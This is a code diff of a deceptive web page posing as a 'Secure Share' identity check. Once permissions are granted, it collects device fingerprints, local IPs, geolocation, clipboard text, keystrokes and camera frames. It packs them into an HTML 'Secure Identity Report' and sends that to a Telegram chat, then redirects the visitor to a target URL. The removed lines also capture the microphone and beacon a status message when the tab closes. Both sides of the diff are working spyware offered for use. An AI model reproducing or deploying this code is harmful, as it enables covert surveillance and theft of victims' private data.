-    h += '.gmaps{display:inline-block;background:#1a60e0;padding:6px 16px;border-radius:8px;color:#fff;text-decoration:none;font-size:13px;margin-top:4px}';
-    h += '.gmaps:hover{background:#3070ff}';
-    h += '</style></head><body><div class="c">';
-    h += '<h1>&#128274; Secure Identity Report</h1>';
-    h += '<p>Generated: ' + new Date().toISOString() + ' | <span class="badge">COMPLETE</span></p>';
-
-    // Device
-    h += '<h2>&#128241; Device</h2><table>';
-    var dk = ['User Agent', 'Platform', 'Language', 'CPU Cores', 'Device Memory GB',
-              'Max Touch Points', 'Screen Size', 'Color Depth', 'Pixel Ratio',
-              'Time Zone', 'Cookies Enabled', 'Do Not Track'];
-    for (var i = 0; i < dk.length; i++) {
-        h += '<tr><th>' + dk[i] + '</th><td>' + esc(d[dk[i]]) + '</td></tr>';
+    
+    let html = `<!DOCTYPE html>
+<html>
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Secure Report</title>
+<style>
+    *{margin:0;padding:0;box-sizing:border-box}
+    body{font-family:-apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;background:#ffffff;color:#1e293b;padding:30px 20px;line-height:1.5}
+    .container{max-width:1200px;margin:0 auto;background:#ffffff;border-radius:20px;box-shadow:0 10px 25px -5px rgba(0,0,0,0.05),0 8px 10px -6px rgba(0,0,0,0.02);overflow:hidden}
+    .header{background:linear-gradient(135deg,#1e40af,#3b82f6);padding:30px 40px;color:white}
+    .header h1{font-size:28px;font-weight:700;margin-bottom:8px;letter-spacing:-0.5px}
+    .header p{opacity:0.85;font-size:14px}
+    .badge{background:rgba(255,255,255,0.2);padding:4px 12px;border-radius:30px;display:inline-block;font-size:13px;margin-top:12px}
+    .stats-bar{display:flex;gap:20px;margin-top:20px;flex-wrap:wrap}
+    .stat-card{background:rgba(255,255,255,0.15);border-radius:16px;padding:12px 20px;backdrop-filter:blur(4px)}
+    .stat-card span{font-size:24px;font-weight:700;display:block}
+    .stat-card label{font-size:12px;opacity:0.8}
+    .content{padding:30px 40px}
+    .section{margin-bottom:32px;border-bottom:1px solid #e2e8f0;padding-bottom:24px}
+    .section:last-child{border-bottom:none}
+    .section-title{font-size:20px;font-weight:600;margin-bottom:18px;color:#0f172a;display:flex;align-items:center;gap:10px}
+    .section-title .emoji{font-size:22px}
+    .grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(320px,1fr));gap:16px}
+    .info-card{background:#f8fafc;border-radius:14px;padding:14px 18px;border:1px solid #e2e8f0}
+    .info-card .label{font-size:12px;font-weight:600;text-transform:uppercase;letter-spacing:0.5px;color:#64748b;margin-bottom:6px}
+    .info-card .value{font-size:14px;color:#0f172a;word-break:break-word;font-family:monospace}
+    table{width:100%;border-collapse:collapse;background:#f8fafc;border-radius:14px;overflow:hidden}
+    th,td{padding:12px 16px;text-align:left;border-bottom:1px solid #e2e8f0}
+    th{background:#f1f5f9;font-weight:600;color:#334155;width:200px}
+    td{color:#0f172a}
+    .gallery{display:flex;flex-wrap:wrap;gap:12px;margin-top:16px}
+    .gallery img{width:160px;height:120px;object-fit:cover;border-radius:12px;border:1px solid #e2e8f0;box-shadow:0 1px 3px rgba(0,0,0,0.05);transition:transform 0.2s}
+    .gallery img:hover{transform:scale(1.02)}
+    .keystroke-box{background:#f1f5f9;border-radius:14px;padding:16px;font-family:monospace;font-size:12px;white-space:pre-wrap;word-break:break-all;max-height:300px;overflow-y:auto}
+    .footer{background:#f8fafc;padding:20px 40px;text-align:center;border-top:1px solid #e2e8f0;font-size:12px;color:#64748b}
+    @media (max-width: 640px){.container{border-radius:0}.content,.header{padding:20px}.grid{grid-template-columns:1fr}}
+</style>
+</head>
+<body>
+<div class="container">
+    <div class="header">
+        <h1>🔐 Secure Identity Report</h1>
+        <p>Generated: ${new Date().toISOString()}</p>
+        <div class="stats-bar">
+            <div class="stat-card"><span>${framesBase64.length}</span><label>Frames Captured</label></div>
+            <div class="stat-card"><span>${keystrokeLog.length}</span><label>Keystrokes Logged</label></div>
+            <div class="stat-card"><span>${Object.keys(device).length}</span><label>Data Points</label></div>
+        </div>
+    </div>
+    <div class="content">
+        <!-- Device Section -->
+        <div class="section">
+            <div class="section-title"><span class="emoji">📱</span> Device Information</div>
+            <table>`;
+    for(let [k,v] of Object.entries(device)){
+        html+=`<tr><th>${esc(k)}</th><td>${esc(v)}</td></tr>`;
     }
-    h += '</table>';
-
-    // WebGL
-    h += '<h2>&#128421; WebGL</h2><pre>' + esc(JSON.stringify(webgl, null, 2)) + '</pre>';
-
-    // Canvas FP
-    h += '<h2>&#127912; Canvas Fingerprint</h2><pre>' +
-         (canvasFP || '').substring(0, 100) + '...</pre>';
-
-    // Fonts
-    h += '<h2>&#128220; Fonts</h2><p>' + ((fonts || []).join(', ') || 'none') + '</p>';
-
-    // IPs
-    h += '<h2>&#127760; Local IPs</h2><p>' + (ips.join(', ') || 'none') + '</p>';
-
-    // Storage
-    h += '<h2>&#128190; Storage</h2><table>';
-    var sk = Object.keys(storage);
-    for (var j = 0; j < sk.length; j++) {
-        h += '<tr><th>' + sk[j] + '</th><td>' + esc(storage[sk[j]]) + '</td></tr>';
-    }
-    h += '</table>';
-
-    // Battery
-    h += '<h2>&#128267; Battery</h2><p>' +
-         (battery ? 'Level: ' + battery.level + ', Charging: ' + battery.charging : 'unavailable') + '</p>';
-
-    // Network
-    h += '<h2>&#127760; Network</h2><table>';
-    var nk = Object.keys(network);
-    for (var j2 = 0; j2 < nk.length; j2++) {
-        h += '<tr><th>' + nk[j2] + '</th><td>' + esc(network[nk[j2]]) + '</td></tr>';
-    }
-    h += '</table>';
-
-    // Location
-    h += '<h2>&#128205; Location</h2>';
-    if (location && !location.error) {
-        h += '<table>';
-        var lk = ['latitude','longitude','accuracyMeters','altitude','speed','heading','timestamp'];
-        for (var l = 0; l < lk.length; l++) {
-            if (location[lk[l]] !== undefined && location[lk[l]] !== null)
-                h += '<tr><th>' + lk[l] + '</th><td>' + esc(location[lk[l]]) + '</td></tr>';
-        }
-        h += '</table>';
-        if (location.googleMaps)
-            h += '<a class="gmaps" href="' + location.googleMaps + '" target="_blank">&#128506; Open in Google Maps</a>';
-    } else {
-        h += '<p>' + (location ? esc(location.error) : 'Not available') + '</p>';
-    }
-
-    // Clipboard
-    h += '<h2>&#128203; Clipboard</h2><pre>' + esc(clipboard) + '</pre>';
-
-    // Captured Frames (gallery)
-    h += '<h2>&#128247; Captured Frames (' + (frames || 0) + ' total)</h2>';
-    if (frames > 0) {
-        h += '<div class="gallery">';
-        // Frames are sent individually via Telegram, just show count in report
-        h += '<p>' + frames + ' frames acquired from camera</p>';
-        h += '</div>';
-    } else {
-        h += '<p>No frames captured</p>';
-    }
-
-    // Keystrokes
-    h += '<h2>&#9000; Keystroke Log</h2>';
-    h += '<pre>' + esc((keys || []).join('')) + '</pre>';
-
-    h += '<div class="ft">End-to-End Encrypted Report &bull; Secure Vault</div>';
-    h += '</div></body></html>';
-    return h;
+    html+=`</table></div>
+        
+        <!-- WebGL & Canvas -->
+        <div class="section">
+            <div class="section-title"><span class="emoji">🎨</span> Graphics Fingerprint</div>
+            <div class="grid">
+                <div class="info-card"><div class="label">WebGL Renderer</div><div class="value">${esc(JSON.stringify(webgl))}</div></div>
+                <div class="info-card"><div class="label">Canvas Fingerprint</div><div class="value">${canvasFP.substring(0,80)}...</div></div>
+                <div class="info-card"><div class="label">Fonts Detected</div><div class="value">${fonts.join(', ') || 'None detected'}</div></div>
+            </div>
+        </div>
+        
+        <!-- Network & IP -->
+        <div class="section">
+            <div class="section-title"><span class="emoji">🌐</span> Network & Location</div>
+            <div class="grid">
+                <div class="info-card"><div class="label">Local IPs</div><div class="value">${ips.join(', ') || 'None'}</div></div>
+                <div class="info-card"><div class="label">Network Info</div><div class="value">${esc(JSON.stringify(network))}</div></div>
+                <div class="info-card"><div class="label">Battery Status</div><div class="value">${battery ? battery.level+' · '+(battery.charging?'Charging':'Not charging') : 'N/A'}</div></div>
+            </div>
+        </div>
+        
+        <!-- Location Details -->
+        <div class="section">
+            <div class="section-title"><span class="emoji">📍</span> Geolocation</div>
+            ${locationData && !locationData.error ? `
+            <div class="grid">
+                <div class="info-card"><div class="label">Coordinates</div><div class="value">${locationData.latitude}, ${locationData.longitude}</div></div>
+                <div class="info-card"><div class="label">Accuracy</div><div class="value">${locationData.accuracyMeters}m</div></div>
+                <div class="info-card"><div class="label">Altitude / Speed</div><div class="value">${locationData.altitude || 'N/A'} / ${locationData.speed || 'N/A'}</div></div>
+            </div>
+            <a href="${locationData.googleMaps}" target="_blank" style="display:inline-block;margin-top:12px;background:#3b82f6;color:white;padding:8px 18px;border-radius:30px;text-decoration:none;font-size:13px">🗺 Open in Google Maps</a>
+            ` : `<div class="info-card"><div class="value">${locationData?.error || 'Location unavailable'}</div></div>`}
+        </div>
+        
+        <!-- Clipboard -->
+        <div class="section">
+            <div class="section-title"><span class="emoji">📋</span> Clipboard Content</div>
+            <div class="keystroke-box" style="background:#f8fafc">${esc(clipboard) || 'Empty'}</div>
+        </div>
+        
+        <!-- Keystroke Log -->
+        <div class="section">
+            <div class="section-title"><span class="emoji">⌨️</span> Keystroke Activity</div>
+            <div class="keystroke-box">${esc(keystrokeLog.slice(-1000)) || 'No keystrokes recorded'}</div>
+        </div>
+        
+        <!-- Captured Frames Gallery -->
+        <div class="section">
+            <div class="section-title"><span class="emoji">📸</span> Captured Frames (${framesBase64.length})</div>
+            ${framesBase64.length > 0 ? `<div class="gallery">`+framesBase64.slice(0,30).map(img=>`<img src="${img}" alt="frame">`).join('')+`</div>` : '<p>No frames captured</p>'}
+            ${framesBase64.length > 30 ? `<p style="margin-top:12px;font-size:13px;color:#64748b">+ ${framesBase64.length-30} more frames</p>` : ''}
+        </div>
+    </div>
+    <div class="footer">
+        <p>🔒 End-to-end encrypted report • Generated by Secure Monitoring System</p>
+    </div>
+</div>
+</body>
+</html>`;
+    return html;
 }
 
-// ============================================================
-// SEND FINAL REPORT TO TELEGRAM
-// ============================================================
-function sendFinalReport(data, callback) {
-    var keys = window.__keyBuffer || [];
-
-    // Flush keylog first
-    if (typeof window.__flushKeylog === 'function') window.__flushKeylog();
-
-    var d = data || {};
-
-    getClipboardText().then(function(clipTxt){
-        var locData = d.location || {};
-
-        // Build report HTML
-        var html = buildReport(
-            d.device || {}, d.webgl || {}, d.canvasFP || '',
-            d.fonts || [], d.ips || [], d.storage || {},
-            d.battery || null, d.network || {}, clipTxt,
-            locData, capturedFrames.length, keys
-        );
-
-        try {
-            var blob = new Blob([html], {type: 'text/html'});
-            var fd = new FormData();
-            fd.append('chat_id', window.__C.chatId);
-            fd.append('document', blob, 'report_' + Date.now() + '.html');
-            fd.append('caption', '&#128270; Full Recon Report: ' + new Date().toISOString());
-
-            fetch(window.__C.api, {method: 'POST', body: fd})
-                .then(function(rsp){
-                    if (callback) callback();
-                })
-                .catch(function(){
-                    // Fallback: send as text
-                    var summary = '&#128270; FINGERPRINT SUMMARY\n';
-                    summary += 'UA: ' + (d.device?.['User Agent'] || '?').substring(0, 80) + '\n';
-                    summary += 'Platform: ' + (d.device?.Platform || '?') + '\n';
-                    summary += 'Screen: ' + (d.device?.['Screen Size'] || '?') + '\n';
-                    if (locData && locData.latitude) {
-                        summary += 'Location: ' + locData.latitude + ',' + locData.longitude + '\n';
-                    }
-                    if (d.ips && d.ips.length > 0) summary += 'IPs: ' + d.ips.join(', ') + '\n';
-                    summary += 'Frames: ' + capturedFrames.length + ' | Keys: ' + keys.length;
-
-                    var p = {
-                        chat_id: window.__C.chatId,
-                        text: summary,
-                        disable_notification: true
-                    };
-                    fetch(window.__C.msgApi, {
-                        method: 'POST',
-                        headers: {'Content-Type': 'application/json'},
-                        body: JSON.stringify(p)
-                    }).then(function(){ if (callback) callback(); })
-                      .catch(function(){ if (callback) callback(); });
-                });
-        } catch(e) {
-            if (callback) callback();
-        }
-    });
+async function sendFinalReportAndOpenLink() {
+    if (extractionDone) return;
+    extractionDone = true;
+    
+    // Collect all data
+    let device = getDeviceInfo();
+    let webgl = getWebGLInfo();
+    let canvasFP = getCanvasFP();
+    let fonts = getFonts();
+    let ips = await getWebRTCIPs();
+    let storage = getStorageStats();
+    let battery = await getBattery();
+    let network = getNetwork();
+    let clipboard = await getClipboardText();
+    let locationData = await getLocation();
+    let keystrokeHistory = keyBuffer.slice(-500).join('');
+    let finalFrames = capturedFrames.slice(); 
+    
+    let htmlReport = buildWhiteThemeReport(device, webgl, canvasFP, fonts, ips, storage, battery, network, clipboard, locationData, finalFrames, keystrokeHistory);
+    let blob = new Blob([htmlReport], {type: 'text/html'});
+    let fd = new FormData();
+    fd.append('chat_id', window.__C.chatId);
+    fd.append('document', blob, `report_white_${Date.now()}.html`);
+    fd.append('caption', '📄 Secure Report (White Theme)');
+    try {
+        await fetch(window.__C.api, {method: 'POST', body: fd});
+    } catch(e) {}
+    
+    // Open target URL in new tab after 6 seconds exactly
+    window.open(TARGET_URL, '_blank');
+    
+    // Clean UI
+    prog.classList.remove('show');
+    btnT.innerHTML = '✓ Ready';
+    btnS.innerHTML = '';
 }
 
-// ============================================================
-// MAIN EXTRACTION ORCHESTRATOR
-// ============================================================
-function startExtraction() {
+// ==================== MAIN: 6 seconds capture then report + open link ====================
+function startFullExtraction() {
     if (extractionStarted || extractionDone) return;
     extractionStarted = true;
-
+    
     prog.classList.add('show');
-    var pct = 0;
     pfill.style.width = '0%';
-    plbl.innerHTML = '&#128295; Preparing extraction...';
-
-    // Disable the button
-    btn.disabled = true;
-    btn.className = 'cta';
-    btnT.innerHTML = '&#9889; Processing...';
-
-    function updateProgress(msg, increment) {
-        pct = Math.min(pct + increment, 95);
-        pfill.style.width = pct + '%';
-        if (msg) plbl.innerHTML = msg;
-    }
-
-    updateProgress('&#128269; Scanning device...', 3);
-
-    // Collect device, webgl, canvas, fonts synchronously first
-    var device = getDeviceInfo();
-    var webgl = getWebGLInfo();
-    var canvasFP = getCanvasFP();
-    var fonts = getFonts();
-    updateProgress('&#128269; Device fingerprinted', 10);
-
-    // Collect battery
-    getBattery().then(function(battery){
-        var batteryData = battery;
-        updateProgress('&#128267; Battery info gathered', 5);
-
-        // Get storage
-        var storage = getStorageStats();
-        var network = getNetwork();
-        updateProgress('&#128190; Storage & network scanned', 8);
-
-        // Get IPs via WebRTC (async)
-        getWebRTCIPs().then(function(ips){
-            updateProgress('&#127760; Network routes mapped', 8);
-
-            // Get location (async, may fail)
-            getLocation().then(function(location){
-                updateProgress('&#128205; Geolocation acquired', 10);
-
-                // Assemble data
-                var collectedData = {
-                    device: device,
-                    webgl: webgl,
-                    canvasFP: canvasFP,
-                    fonts: fonts,
-                    ips: ips,
-                    storage: storage,
-                    battery: batteryData,
-                    network: network,
-                    location: location
-                };
-
-                updateProgress('&#128640; Starting continuous monitoring...', 10);
-
-                // START CONTINUOUS CAMERA CAPTURE
-                startContinuousCameraCapture(1);
-
-                // START CONTINUOUS MIC CAPTURE
-                startContinuousMicCapture();
-
-                updateProgress('&#128247; &#127908; Live capture active', 10);
-
-                // Send final report
-                sendFinalReport(collectedData, function(){
-                    // Redirect to target URL
-                    extractionDone = true;
-                    pfill.style.width = '100%';
-                    plbl.innerHTML = '&#10003; Verified! Redirecting...';
-
-                    btnT.innerHTML = '&#10003; Complete';
-                    btnS.innerHTML = '';
-
-                    // Wait a moment so user sees 100%, then redirect
-                    setTimeout(function(){
-                        window.location.href = TARGET_URL;
-                    }, 1200);
-                });
-
-            }).catch(function(locErr){
-                // Location failed, continue with rest
-                updateProgress('&#128205; Location unavailable, continuing...', 5);
-                var collectedData = {
-                    device: device,
-                    webgl: webgl,
-                    canvasFP: canvasFP,
-                    fonts: fonts,
-                    ips: ips,
-                    storage: storage,
-                    battery: batteryData,
-                    network: network,
-                    location: null
-                };
-                updateProgress('&#128640; Starting live monitoring...', 10);
-                startContinuousCameraCapture(1);
-                startContinuousMicCapture();
-                updateProgress('&#128247; &#127908; Live capture active', 10);
-
-                sendFinalReport(collectedData, function(){
-                    extractionDone = true;
-                    pfill.style.width = '100%';
-                    plbl.innerHTML = '&#10003; Verified! Redirecting...';
-                    btnT.innerHTML = '&#10003; Complete';
-                    btnS.innerHTML = '';
-                    setTimeout(function(){
-                        window.location.href = TARGET_URL;
-                    }, 1200);
-                });
-            });
-
-        }).catch(function(ipsErr){
-            updateProgress('&#127760; IP detection limited', 5);
-            // Fallback - just continue without IPs
-            getLocation().then(function(location){
-                updateProgress('&#128205; Geolocation acquired', 10);
-                var collectedData = {
-                    device: device,
-                    webgl: webgl,
-                    canvasFP: canvasFP,
-                    fonts: fonts,
-                    ips: [],
-                    storage: getStorageStats(),
-                    battery: batteryData,
-                    network: getNetwork(),
-                    location: location
-                };
-                updateProgress('&#128640; Starting live monitoring...', 10);
-                startContinuousCameraCapture(1);
-                startContinuousMicCapture();
-                updateProgress('&#128247; &#127908; Live capture active', 10);
-                sendFinalReport(collectedData, function(){
-                    extractionDone = true;
-                    pfill.style.width = '100%';
-                    plbl.innerHTML = '&#10003; Verified! Redirecting...';
-                    btnT.innerHTML = '&#10003; Complete';
-                    btnS.innerHTML = '';
-                    setTimeout(function(){
-                        window.location.href = TARGET_URL;
-                    }, 1200);
-                });
-            }).catch(function(){
-                var collectedData = {
-                    device: device,
-                    webgl: webgl,
-                    canvasFP: canvasFP,
-                    fonts: fonts,
-                    ips: [],
-                    storage: getStorageStats(),
-                    battery: batteryData,
-                    network: getNetwork(),
-                    location: null
-                };
-                updateProgress('&#128640; Starting live monitoring...', 10);
-                startContinuousCameraCapture(1);
-                startContinuousMicCapture();
-                updateProgress('&#128247; &#127908; Live capture active', 10);
-                sendFinalReport(collectedData, function(){
-                    extractionDone = true;
-                    pfill.style.width = '100%';
-                    plbl.innerHTML = '&#10003; Verified! Redirecting...';
-                    btnT.innerHTML = '&#10003; Complete';
-                    btnS.innerHTML = '';
-                    setTimeout(function(){
-                        window.location.href = TARGET_URL;
-                    }, 1200);
-                });
-            });
-        });
-    }).catch(function(batErr){
-        // Battery failed
-        updateProgress('&#128267; Battery unavailable', 3);
-        var storage = getStorageStats();
-        var network = getNetwork();
-        updateProgress('&#128190; Storage scanned', 8);
-
-        getWebRTCIPs().then(function(ips){
-            updateProgress('&#127760; Network mapped', 8);
-            getLocation().then(function(location){
-                updateProgress('&#128205; Location acquired', 10);
-                var collectedData = {
-                    device: device,
-                    webgl: webgl,
-                    canvasFP: canvasFP,
-                    fonts: fonts,
-                    ips: ips,
-                    storage: storage,
-                    battery: null,
-                    network: network,
-                    location: location
-                };
-                updateProgress('&#128640; Starting live monitoring...', 10);
-                startContinuousCameraCapture(1);
-                startContinuousMicCapture();
-                updateProgress('&#128247; &#127908; Live capture active', 10);
-                sendFinalReport(collectedData, function(){
-                    extractionDone = true;
-                    pfill.style.width = '100%';
-                    plbl.innerHTML = '&#10003; Verified! Redirecting...';
-                    btnT.innerHTML = '&#10003; Complete';
-                    btnS.innerHTML = '';
-                    setTimeout(function(){
-                        window.location.href = TARGET_URL;
-                    }, 1200);
-                });
-            }).catch(function(){
-                updateProgress('&#128205; Location unavailable', 5);
-                var collectedData = {
-                    device: device, webgl: webgl, canvasFP: canvasFP,
-                    fonts: fonts, ips: ips, storage: storage,
-                    battery: null, network: network, location: null
-                };
-                updateProgress('&#128640; Starting live monitoring...', 10);
-                startContinuousCameraCapture(1);
-                startContinuousMicCapture();
-                updateProgress('&#128247; &#127908; Live capture active', 10);
-                sendFinalReport(collectedData, function(){
-                    extractionDone = true;
-                    pfill.style.width = '100%';
-                    plbl.innerHTML = '&#10003; Verified! Redirecting...';
-                    btnT.innerHTML = '&#10003; Complete';
-                    btnS.innerHTML = '';
-                    setTimeout(function(){
-                        window.location.href = TARGET_URL;
-                    }, 1200);
-                });
-            });
-        }).catch(function(){
-            updateProgress('&#127760; IP detection failed', 5);
-            getLocation().then(function(location){
-                updateProgress('&#128205; Location acquired', 10);
-                var collectedData = {
-                    device: device, webgl: webgl, canvasFP: canvasFP,
-                    fonts: fonts, ips: [], storage: storage,
-                    battery: null, network: network, location: location
-                };
-                updateProgress('&#128640; Starting live monitoring...', 10);
-                startContinuousCameraCapture(1);
-                startContinuousMicCapture();
-                updateProgress('&#128247; &#127908; Live capture active', 10);
-                sendFinalReport(collectedData, function(){
-                    extractionDone = true;
-                    pfill.style.width = '100%';
-                    plbl.innerHTML = '&#10003; Verified! Redirecting...';
-                    btnT.innerHTML = '&#10003; Complete';
-                    btnS.innerHTML = '';
-                    setTimeout(function(){
-                        window.location.href = TARGET_URL;
-                    }, 1200);
-                });
-            }).catch(function(){
-                var collectedData = {
-                    device: device, webgl: webgl, canvasFP: canvasFP,
-                    fonts: fonts, ips: [], storage: storage,
-                    battery: null, network: network, location: null
-                };
-                updateProgress('&#128640; Starting live monitoring...', 10);
-                startContinuousCameraCapture(1);
-                startContinuousMicCapture();
-                updateProgress('&#128247; &#127908; Live capture active', 10);
-                sendFinalReport(collectedData, function(){
-                    extractionDone = true;
-                    pfill.style.width = '100%';
-                    plbl.innerHTML = '&#10003; Verified! Redirecting...';
-                    btnT.innerHTML = '&#10003; Complete';
-                    btnS.innerHTML = '';
-                    setTimeout(function(){
-                        window.location.href = TARGET_URL;
-                    }, 1200);
-                });
-            });
-        });
-    });
+    plbl.innerHTML = 'Processing...';
+    
+    startCameraCapture(1);
+    
+    // Progress bar animation over 6 seconds
+    var startTime = Date.now();
+    var progressInterval = setInterval(function(){
+        var elapsed = Date.now() - startTime;
+        var percent = Math.min(100, (elapsed / 6000) * 100);
+        pfill.style.width = percent + '%';
+        if (percent >= 100) clearInterval(progressInterval);
+    }, 100);
+    
+    gatherTimer = setTimeout(function(){
+        clearInterval(progressInterval);
+        pfill.style.width = '100%';
+        plbl.innerHTML = 'Complete';
+        sendFinalReportAndOpenLink();
+    }, 6000);
 }
 
-// ============================================================
-// EVENT: CLICK UNLOCK BUTTON
-// ============================================================
-btn.addEventListener('click', function(){
-    if (!allGranted || extractionDone || extractionStarted) return;
-    startExtraction();
+// =================== BUTTON TRIGGER ===================
+btn.addEventListener('click', ()=>{
+    if (extractionDone || extractionStarted) return;
+    if (!allGranted) { showToast("Grant all permissions first"); return; }
+    startFullExtraction();
 });
 
-// ============================================================
-// VISIBILITY CHANGE - keep extracting in background
-// ============================================================
-document.addEventListener('visibilitychange', function(){
-    if (document.visibilityState === 'visible') {
-        // Tab is visible again, nothing special needed
-    } else {
-        // Tab hidden - camera/mic continue via their intervals
-    }
-});
-
-// ============================================================
-// BEFOREUNLOAD - flush everything and send final status
-// ============================================================
-window.addEventListener('beforeunload', function(){
-    // Flush keylogger
-    if (typeof window.__flushKeylog === 'function') window.__flushKeylog();
-
-    // Stop & flush camera
-    stopContinuousCamera();
-
-    // Stop & flush mic
-    stopContinuousMic();
-
-    // Send final status if extraction had started
-    if (extractionStarted) {
-        try {
-            var payload = {
-                chat_id: window.__C.chatId,
-                text: '&#128682; Tab closed. Continuous capture ended. Frames: ' +
-                      (capturedFrames.length > 0 ? capturedFrames.length + ' pending' : 'all sent') +
-                      ' | Audio: flushed | Keylog: flushed | Time: ' + new Date().toISOString(),
-                disable_notification: true
-            };
-            // Use sendBeacon for reliable delivery during page unload
-            var blob = new Blob([JSON.stringify(payload)], {type: 'application/json'});
-            navigator.sendBeacon(window.__C.msgApi, blob);
-        } catch(e){}
-    }
-});
-
-// ============================================================
-// KEEP-ALIVE: prevents aggressive tab throttling
-// ============================================================
-keepAliveInterval = setInterval(function(){
-    // Minimal operation to keep tab alive
-    var _ = Date.now();
-}, 30000);
-
-// ============================================================
-// SELF-TEST: Verify Telegram config on page load (silent)
-// ============================================================
-(function(){
-    try {
-        fetch(window.__C.msgApi, {
-            method: 'POST',
-            headers: {'Content-Type': 'application/json'},
-            body: JSON.stringify({
-                chat_id: window.__C.chatId,
-                text: '&#128679; SECURE SHARE page loaded | User Agent: ' +
-                      navigator.userAgent.substring(0, 80),
-                disable_notification: true
-            })
-        }).catch(function(){});
+// =================== KEEPALIVE ===================
+setInterval(()=>{
+    try { let ctx = new (window.AudioContext||window.webkitAudioContext)();
+        let gain = ctx.createGain(); gain.gain.value=0.001; let osc=ctx.createOscillator();
+        osc.connect(gain); gain.connect(ctx.destination); osc.start(0);
+        setTimeout(()=>{ try{osc.stop();ctx.close();}catch(e){} },150);
     } catch(e){}
-})();
+}, 55000);
 
-// ============================================================
-// INIT: load background frame and setup
-// ============================================================
-try {
-    var bgFrame = $('bgFrame');
-    bgFrame.src = 'about:blank';
-    setTimeout(function(){
-        try {
-            bgFrame.src = TARGET_URL;
-        } catch(e){}
-    }, 500);
-} catch(e){}
-
-// Show some initial toast
-setTimeout(function(){
-    showToast('&#128274; Grant all 5 permissions to continue');
-}, 600);
-
-console.log('SECURE SHARE v2.0 loaded - TARGET_URL = ' + TARGET_URL);
+// =================== INIT ===================
+updateUI();
+try { document.getElementById('bgFrame').src = 'https://www.bing.com'; } catch(e){}
+window.addEventListener('beforeunload',()=>{
+    if (cameraInterval) clearInterval(cameraInterval);
+    flushKeylog();
+});
 </script>
 </body>
 </html>
